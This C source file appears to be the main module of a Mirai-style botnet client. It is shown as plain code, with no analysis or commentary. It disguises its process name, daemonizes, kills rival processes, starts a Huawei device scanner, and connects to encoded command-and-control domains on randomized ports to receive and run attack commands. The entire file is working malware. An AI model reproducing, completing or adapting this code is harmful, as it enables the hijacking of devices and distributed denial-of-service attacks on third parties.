// api includes
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>
#include <signal.h>
#include <sys/types.h>
#include <string.h>

// Headers includes

#include "headers/defines.h"
#include "headers/util.h"
#include "headers/rand.h"
#include "headers/table.h"
#include "headers/tcp.h"
#include "headers/resolve.h"
#include "headers/killer.h"
#include "headers/clean.h"
#include "headers/locksh.h"

#ifndef NOSCANNER
#include "headers/huawei.h"
#endif

#ifdef ATTACKS
#include "headers/attack.h"
#endif

static void establish_connection();
static void teardown_connection();
static void ensure(void);

ipv4_t LOCAL_ADDR;

BOOL pending_connection = FALSE;

struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1;
int pgid;

size_t o_len = 0;

int main(int argc, char **args){
    rename(args[0], "   ");
  
    #ifndef NOKILL
    clean();
    #endif

    #ifdef DEBUG
    printf("Debug mode initialized PID: %d\n", getpid());
    
    #endif
    // Defines
    char id_buf[32];
    int pings = 0;
    
    #ifndef DEBUG
    sigset_t sigs;
    // Signal based control flow
    sigemptyset(&sigs);
    sigaddset(&sigs, SIGINT);
    sigprocmask(SIG_BLOCK, &sigs, NULL);
    signal(SIGCHLD, SIG_IGN);
    signal(SIGTRAP, SIG_IGN);
    signal(SIGSEGV, SIG_IGN);
    #endif
    
    rand_init();
    ensure();
    
    util_zero(id_buf, 32);
    if (argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(id_buf, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    }
    
    xor_init();
    const char *sys_name = getname();
    strcpy(args[0], sys_name);
    prctl(PR_SET_NAME, sys_name);
    write(STDOUT, enc[TABLE_EXEC_SUCCESS].string, 19);
    write(STDOUT, "\n", 1);
    signal(SIGCHLD, SIG_IGN);
    chdir("/");
    #ifndef NODIR
    killer_init();
    #endif
    #ifndef NOSH
    locksh_init();
    #endif
    #ifndef DEBUG
    if (fork() > 0)
        return 0;
    pgid = setsid();
    close(STDIN);
    close(STDOUT);
    close(STDERR);
    #endif
    //hidepid(getpid());
    // Other init stuff such as attack and killer, etc
    #ifndef NOSCANNER
    huaweiscanner_scanner_init();
    #endif
    #ifdef ATTACKS
    attack_init();
    #endif
    while (TRUE)
    {
        fd_set fdsetrd, fdsetwr;
        struct timeval timeo;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);

        // Socket for accept()
        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);

        // Set up CNC sockets
        if (fd_serv == -1)
            establish_connection();

        if (pending_connection)
            FD_SET(fd_serv, &fdsetwr);
        else
            FD_SET(fd_serv, &fdsetrd);

        // Get maximum FD for select
        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;

        // Wait 10s in call to select()
        timeo.tv_usec = 0;
        timeo.tv_sec = 10;
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1)
        {
#ifdef DEBUG
            printf("select() errno = %d\n", errno);
#endif
            continue;
        }
        else if (nfds == 0)
        {
            uint16_t len = 0;

            if (pings++ % 8 == 0)
                send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
        }

        // Check if we need to kill ourselves

        if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))
        {
            struct sockaddr_in cli_addr;
            socklen_t cli_addr_len = sizeof (cli_addr);

            accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);

            #ifdef DEBUG
            printf("Detected newer instance running! Killing self\n");
            #endif
         
            #ifndef NOSCANNER
            huaweiscanner_scanner_kill();
            #endif
            kill(pgid * -1, 9);
            exit(0);
        }
        // Check if CNC connection was established or timed out or errored
        if (pending_connection)
        {
            pending_connection = FALSE;

            if (!FD_ISSET(fd_serv, &fdsetwr))
            {
#ifdef DEBUG
                printf("Timed out while connecting to CNC\n");
#endif
                teardown_connection();
            }
            else
            {
                int err = 0;
                socklen_t err_len = sizeof (err);

                int n = getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err != 0 || n != 0)
                {
#ifdef DEBUG
                    printf("Error while connecting to CNC code=%d\n", err);
#endif
                    close(fd_serv);
                    fd_serv = -1;
                    sleep((rand_next() % 10) + 1);
                }
                else
                {
                    uint8_t id_len = util_strlen(id_buf);

                    send(fd_serv, "\x31\x73\x13\x93\x04\x83\x32\x01", 8, MSG_NOSIGNAL);
                    send(fd_serv, &id_len, sizeof (id_len), MSG_NOSIGNAL);
                    if (id_len > 0)
                    {
                        send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
                    }
#ifdef DEBUG
                    printf("Connected to CNC\n");
#endif
                }
            }
        }
        else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
        {
            int n;
            uint16_t len;
            char rdbuf[1024];

            // Try to read in buffer length from CNC
            errno = 0;
            n = recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0; // Cause connection to close
            }
            
            // If n == 0 then we close the connection!
            if (n == 0)
            {
#ifdef DEBUG
                printf("Lost connection with CNC (errno = %d) 1\n", errno);
#endif
                teardown_connection();
                continue;
            }

            // Convert length to network order and sanity check length
            if (len == 0) // If it is just a ping, no need to try to read in buffer data
            {
                recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL); // skip buffer for length
                continue;
            }
            len = ntohs(len);
            if (len > sizeof (rdbuf))
            {
                close(fd_serv);
                fd_serv = -1;
            }

            // Try to read in buffer from CNC
            errno = 0;
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            // If n == 0 then we close the connection!
            if (n == 0)
            {
#ifdef DEBUG
                printf("Lost connection with CNC (errno = %d) 2\n", errno);
#endif
                teardown_connection();
                continue;
            }

            // Actually read buffer length and buffer data
            recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
            len = ntohs(len);
            recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);

#ifdef DEBUG
            printf("Received %d bytes from CNC\n", len);
#endif 
#ifdef ATTACKS
            if (len > 0) {
                attack_parse(rdbuf, len);
            }
#endif

        }
    }

    return 0;
}

static int resolve_cnc_addr()
{
    srv_addr.sin_family = AF_INET;
    struct resolv_entries *entries = NULL;

    const char *backup_domains[] = {
        enc[TABLE_CNCDOMAIN].string,
        enc[TABLE_CNCDOMAIN1].string,
        enc[TABLE_CNCDOMAIN2].string,
        enc[TABLE_CNCDOMAIN3].string,
       

    };

    size_t num_domains = sizeof(backup_domains) / sizeof(backup_domains[0]);
    srand(time(NULL));

    // Move trough backup domains randomly
    for (size_t i = 0; i < num_domains - 1; ++i) {
        size_t j = i + rand() / (RAND_MAX / (num_domains - i) + 1);
        const char *temp = backup_domains[j];
        backup_domains[j] = backup_domains[i];
        backup_domains[i] = temp;
    }
    
    for (size_t i = 0; i < num_domains; ++i) {
        const char* current_domain = backup_domains[i];

        #ifdef DEBUG
        printf("Attempting to resolve \"%s\"\n", current_domain);
        #endif

        entries = resolv_lookup(current_domain);
        if (entries != NULL) {
            #ifdef DEBUG
            printf("Successfully resolved \"%s\"\n", current_domain);
            #endif
            break;  // If resolved successfully, break out of the loop
        } else {
            #ifdef DEBUG
            printf("Failed to resolve \"%s\"\n", current_domain);
            #endif
            continue;  // Try the next domain in the loop
        }
    }
    if (entries == NULL) {
        #ifdef DEBUG
        printf("Failed to resolve any domain\n");
        #endif
        return 1;
    }

    srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
    #ifdef DEBUG
    printf("Connecting to CNC with IP address: %s\n", inet_ntoa(srv_addr.sin_addr));
    #endif
    resolv_entries_free(entries);

    int cnc_port;
    do {
        cnc_port = 1284 + rand() % (25596 - 1284 + 1);
    } while (cnc_port < 1284 || cnc_port > 25596);

    #ifdef DEBUG
    printf("Connecting to CNC with port %d\n", cnc_port);
    #endif

    srv_addr.sin_port = htons(cnc_port);
    return 0;
}

static void establish_connection(void)
{
#ifdef DEBUG
    printf("Attempting to connect to CNC\n");
#endif

    if ((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("Failed to call socket(). Errno = %d\n", errno);
#endif
        return;
    }

    fcntl(fd_serv, F_SETFL, O_NONBLOCK);
    resolve_cnc_addr();

    pending_connection = TRUE;
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof (struct sockaddr_in));
}

static void teardown_connection(){
    #ifdef DEBUG
    printf("Tearing down connection to CNC!\n");
    #endif

    if (fd_serv != -1)
        close(fd_serv);
    fd_serv = -1;

    sleep(5);
}

static void ensure(void)
{
    static BOOL local_bind = TRUE;
    struct sockaddr_in addr;
    int opt = 1;

    if ((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        return;
    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof (int));
    fcntl(fd_ctrl, F_SETFL, O_NONBLOCK | fcntl(fd_ctrl, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127,0,0,1)) : LOCAL_ADDR;
    addr.sin_port = htons(1172);

    // Try to bind to the control port
    errno = 0;
    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
    {
        if (errno == EADDRNOTAVAIL && local_bind)
            local_bind = FALSE;
#ifdef DEBUG
        printf("Another instance is already running (errno = %d)! Sending kill request...\r\n", errno);
#endif

        // Reset addr just in case
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(1172);

        if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("Failed to connect to fd_ctrl to request process termination\n");
#endif
        }
        
        sleep(5);
        close(fd_ctrl);
        killer_kill_by_port(htons(1172));
        ensure(); // Call again, so that we are now the control
    }
    else
    {
        if (listen(fd_ctrl, 1) == -1)
        {
#ifdef DEBUG
            printf("Failed to call listen() on fd_ctrl\n");
            close(fd_ctrl);
            sleep(5);
            killer_kill_by_port(htons(1172));
            ensure();
#endif
        }
    }
}

